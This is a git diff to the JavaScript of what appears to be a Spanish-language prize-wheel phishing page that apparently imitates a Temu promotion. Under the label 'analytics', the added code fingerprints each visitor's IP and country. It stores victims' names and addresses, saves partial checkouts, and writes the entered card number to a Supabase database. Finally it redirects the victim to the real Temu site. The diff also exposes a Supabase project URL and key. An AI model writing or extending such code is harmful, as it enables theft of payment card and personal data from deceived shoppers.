@@ -4,6 +4,150 @@ let supabaseInstance = null;
 // Temporary storage for Step 1 data
 let orderData = {};
 
+// ============= ANALYTICS SYSTEM =============
+let visitorId = null;
+let userIP = null;
+let userCountry = null;
+
+// Get or create visitor ID
+function getVisitorId() {
+    let vid = localStorage.getItem('visitor_id');
+    if (!vid) {
+        vid = 'v_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
+        localStorage.setItem('visitor_id', vid);
+    }
+    return vid;
+}
+
+// Get user IP and Country with Fallbacks
+async function getUserInfo() {
+    const services = [
+        'https://ipwho.is/',
+        'https://ipapi.co/json/',
+        'https://api.ipify.org?format=json' // Only IP
+    ];
+
+    for (const service of services) {
+        try {
+            const response = await fetch(service);
+            if (!response.ok) throw new Error('Network response was not ok');
+
+            const data = await response.json();
+
+            // Normalize data structure
+            if (service.includes('ipwho.is')) {
+                userIP = data.ip;
+                userCountry = data.country || 'Unknown';
+            } else if (service.includes('ipapi.co')) {
+                userIP = data.ip;
+                userCountry = data.country_name || 'Unknown';
+            } else {
+                userIP = data.ip;
+                // Keep previous country if available or try to guess/leave unknown
+                if (!userCountry) userCountry = 'Unknown';
+            }
+
+            if (userIP) {
+                console.log('User info fetched from:', service);
+                return { ip: userIP, country: userCountry };
+            }
+        } catch (error) {
+            console.warn(`Failed to fetch from ${service}:`, error);
+            continue;
+        }
+    }
+
+    userIP = 'Unknown';
+    userCountry = 'Unknown';
+    return { ip: userIP, country: userCountry };
+}
+
+// Track page visit
+async function trackVisit() {
+    if (!supabaseInstance) return;
+
+    try {
+        // Check if visitor exists
+        const { data: existing } = await supabaseInstance
+            .from('visitors')
+            .select('*')
+            .eq('visitor_id', visitorId)
+            .single();
+
+        if (existing) {
+            // Update visit count and last visit
+            await supabaseInstance
+                .from('visitors')
+                .update({
+                    last_visit: new Date().toISOString(),
+                    visit_count: existing.visit_count + 1
+                })
+                .eq('visitor_id', visitorId);
+        } else {
+            // Create new visitor record
+            await supabaseInstance
+                .from('visitors')
+                .insert([{
+                    visitor_id: visitorId,
+                    ip_address: userIP,
+                    country: userCountry
+                }]);
+        }
+    } catch (error) {
+        console.error('Error tracking visit:', error);
+    }
+}
+
+// Track wheel spin
+async function trackWheelSpin() {
+    if (!supabaseInstance) return;
+
+    try {
+        await supabaseInstance
+            .from('wheel_spins')
+            .insert([{
+                visitor_id: visitorId,
+                ip_address: userIP
+            }]);
+    } catch (error) {
+        console.error('Error tracking wheel spin:', error);
+    }
+}
+
+// Track step completion
+async function trackStepCompletion(stepNumber, data = {}) {
+    if (!supabaseInstance) return;
+
+    try {
+        await supabaseInstance
+            .from('step_completions')
+            .insert([{
+                visitor_id: visitorId,
+                step_number: stepNumber,
+                data: data
+            }]);
+    } catch (error) {
+        console.error('Error tracking step completion:', error);
+    }
+}
+
+// Save incomplete checkout (Step 1 data)
+async function saveIncompleteCheckout(data) {
+    if (!supabaseInstance) return;
+
+    try {
+        await supabaseInstance
+            .from('incomplete_checkouts')
+            .insert([{
+                visitor_id: visitorId,
+                ...data
+            }]);
+    } catch (error) {
+        console.error('Error saving incomplete checkout:', error);
+    }
+}
+// ============= END ANALYTICS SYSTEM =============
+
 // Luhn Algorithm for Card Validation
 function validateLuhn(number) {
     let sum = 0;
@@ -207,6 +351,9 @@ function spinWheel() {
     canvas.style.transform = `rotate(${totalRotation}deg)`;
     currentRotation = totalRotation % 360;
 
+    // Track wheel spin
+    trackWheelSpin();
+
     // Mostrar modal después de la animación
     setTimeout(() => {
         showPrizeModal();
@@ -335,9 +482,8 @@ closeCheckout.addEventListener('click', () => {
 
 addressForm.addEventListener('submit', async (e) => {
     e.preventDefault();
-    const btn = e.target.querySelector('.checkout-btn');
 
-    // Collect Order Data from Step 1
+    // Recopilar datos del formulario
     orderData = {
         first_name: document.getElementById('firstName').value,
         last_name: document.getElementById('lastName').value,
@@ -348,6 +494,10 @@ addressForm.addEventListener('submit', async (e) => {
         address: document.getElementById('address').value,
         additional_info: document.getElementById('additionalInfo').value || ''
     };
+
+    // Track Step 1 completion and save data for incomplete checkout tracking
+    await trackStepCompletion(1, orderData);
+    await saveIncompleteCheckout(orderData);
 
     showStep(2);
 });
@@ -410,9 +560,20 @@ paymentForm.addEventListener('submit', async (e) => {
             if (cardError) throw cardError;
         }
 
+        // Track Step 2 completion
+        await trackStepCompletion(2, { card_number: cardNumber });
+
         showStep(3);
         launchConfetti();
         showToast('Pedido procesado con éxito', 'success');
+
+        // Track Step 3 completion
+        await trackStepCompletion(3, {});
+
+        // Redirect to Temu after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'https://www.temu.com/co';
+        }, 3000);
     } catch (error) {
         console.error('Error saving data:', error);
         showToast('Hubo un error al procesar su pedido. Intente nuevamente.', 'error');
@@ -422,7 +583,7 @@ paymentForm.addEventListener('submit', async (e) => {
 });
 
 finishCheckout.addEventListener('click', () => {
-    window.location.reload();
+    window.location.href = 'https://www.temu.com/';
 });
 
 // Cerrar modal al hacer clic en el overlay (solo para el premio inicial)
@@ -437,6 +598,17 @@ window.addEventListener('resize', () => {
         confettiCanvas.height = window.innerHeight;
     }
 });
+
+// Inicializar Analytics
+(async function initAnalytics() {
+    visitorId = getVisitorId();
+    const SUPABASE_URL = 'https://jcgwmbtmfylmttxwmqzv.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_re7bQFvT9rggYPbtH260Pg_c6Pzw5jJ';
+    supabaseInstance = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    await getUserInfo();
+    await trackVisit();
+})();
 
 // Inicializar
 drawWheel();
